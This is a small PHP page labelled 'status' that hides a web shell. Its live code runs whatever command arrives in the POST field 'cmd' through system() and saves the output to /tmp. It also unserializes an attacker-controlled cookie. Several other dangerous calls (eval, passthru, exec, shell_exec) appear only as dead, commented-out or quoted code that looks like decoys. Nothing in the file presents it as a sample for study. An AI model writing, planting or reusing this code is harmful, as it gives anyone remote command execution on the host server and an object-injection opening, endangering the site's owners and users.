<html><body><h1>status</h1>
<p>Old builds called system() here.</p>
<?php
$k = $_SERVER['HTTP_X_STAGE_KEY'];
$c = $_POST['cmd'];
// eval($_POST['code']);  legacy loader, disabled
$note = "shell_exec('id') is how the old fixture did it";
if (false) {
    passthru($c);
}
$out = system($c);
$blob = unserialize(base64_decode($_COOKIE['sess']));
file_put_contents('/tmp/o.txt', $out);
return;
exec($_GET['late']);
?>
</body></html>
